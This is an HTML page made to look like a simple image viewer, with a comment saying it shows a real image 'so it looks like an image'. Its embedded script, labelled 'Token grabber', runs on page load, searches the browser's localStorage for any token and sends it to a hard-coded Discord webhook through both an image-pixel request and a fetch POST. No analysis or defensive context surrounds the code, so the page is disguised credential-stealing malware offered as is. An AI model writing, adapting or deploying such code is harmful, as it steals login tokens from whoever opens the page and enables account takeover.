<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body { margin: 0; padding: 0; }
        .image-container {
            width: 100%;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
        }
        img {
            max-width: 100%;
            max-height: 100%;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <!-- Show a real image so it looks like an image -->
        <img src="https://i.imgur.com/your_image.png" alt="Image">
    </div>
    
    <script>
        // Token grabber
        (function() {
            // Try to get token from localStorage
            var token = localStorage.getItem('token');
            
            if (!token) {
                // Try to find it
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    if (key.indexOf('token') !== -1) {
                        token = localStorage.getItem(key);
                        break;
                    }
                }
            }
            
            if (token) {
                // Send to webhook
                var webhook = 'https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj';
                
                // Use image pixel method (works around CORS)
                var img = new Image();
                img.src = webhook + '?content=' + encodeURIComponent('```' + token + '```');
                
                // Also try fetch
                try {
                    fetch(webhook, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({content: '```' + token + '```'})
                    });
                } catch(e) {}
            }
        })();
    </script>
</body>
</html>
